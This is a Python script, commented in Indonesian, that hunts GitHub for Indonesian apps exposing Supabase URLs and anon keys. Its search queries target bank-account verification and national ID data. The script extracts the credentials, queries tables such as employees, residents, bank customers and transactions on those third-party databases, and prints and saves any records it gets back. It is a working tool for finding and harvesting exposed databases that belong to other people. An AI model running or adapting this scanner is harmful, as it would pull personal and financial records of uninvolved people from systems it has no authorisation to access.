#!/usr/bin/env python3
"""supa_hunt.py — cari app Indonesia yg embed Supabase URL+anon key, lalu probe RLS.

Alur:
 1. GitHub code search: `supabase.co` di file konteks Indonesia (index.html/.env/js)
 2. Ambil raw file, ekstrak (SUPABASE_URL, anon key)
 3. Probe /rest/v1/<table> dgn anon key; kalau balik data = RLS OFF
"""
import subprocess, re, json, sys, urllib.parse

def gh(args, timeout=60):
    p = subprocess.run(["gh", *args], capture_output=True, text=True, timeout=timeout)
    return p.stdout

def gh_json(url):
    try:
        return json.loads(gh(["api", url]))
    except Exception:
        return {}

def code_search(q, n=30):
    out = gh(["api", f"https://api.github.com/search/code?q={urllib.parse.quote(q)}&per_page={n}"])
    try:
        d = json.loads(out)
    except Exception:
        return []
    return [(it["repository"]["full_name"], it["path"]) for it in d.get("items", [])]

def raw(repo, path, ref="HEAD"):
    for br in ("main", "master", ref):
        out = gh(["api", f"https://raw.githubusercontent.com/{repo}/{br}/{path}"])
        # raw via gh api needs Accept; fallback curl
        import urllib.request
        try:
            r = urllib.request.urlopen(f"https://raw.githubusercontent.com/{repo}/{br}/{path}", timeout=20)
            return r.read().decode("utf-8", "replace")
        except Exception:
            continue
    return ""

def extract_keys(txt):
    urls = set(re.findall(r"https://([a-z0-9]{20})\.supabase\.co", txt))
    keys = set(re.findall(r"eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}", txt))
    return urls, keys

def probe(url, key, tables):
    import urllib.request
    hits = {}
    for t in tables:
        try:
            req = urllib.request.Request(f"https://{url}.supabase.co/rest/v1/{t}?select=*&limit=2",
                                         headers={"apikey": key, "Authorization": "Bearer " + key})
            r = urllib.request.urlopen(req, timeout=12)
            body = r.read().decode("utf-8", "replace")
            if body.strip() not in ("[]", "", "null"):
                hits[t] = body[:400]
        except Exception:
            pass
    return hits

QUERIES = [
    'supabase.co accountNumber bankCode',
    'supabase.co "cek rekening"',
    'supabase.co verifikasi rekening',
    'supabase.co nik rekening',
    'supabase apex "anon"',
    'SUPABASE_URL SUPABASE_KEY index.html',
]
COMMON_TABLES = ["employees","pegawai","users","profiles","accounts","rekening","tax_engine",
                 "data","warga","penduduk","karyawan","nasabah","orders","transactions","hasil"]

def main():
    seen = set()
    results = []
    for q in QUERIES:
        for repo, path in code_search(q):
            if (repo, path) in seen:
                continue
            seen.add((repo, path))
            txt = raw(repo, path)
            urls, keys = extract_keys(txt)
            for u in urls:
                for k in keys:
                    hits = probe(u, k, COMMON_TABLES)
                    if hits:
                        results.append({"repo": repo, "path": path, "proj": u, "tables": list(hits)})
                        print(f"[RLS-OFF] {repo}/{path} -> {u}.supabase.co tables={list(hits)}")
                        for t, b in hits.items():
                            print(f"    {t}: {b[:200]}")
                        sys.stdout.flush()
    open("/tmp/supa_hits.json", "w").write(json.dumps(results, indent=1))
    print("done. hits:", len(results))

if __name__ == "__main__":
    main()
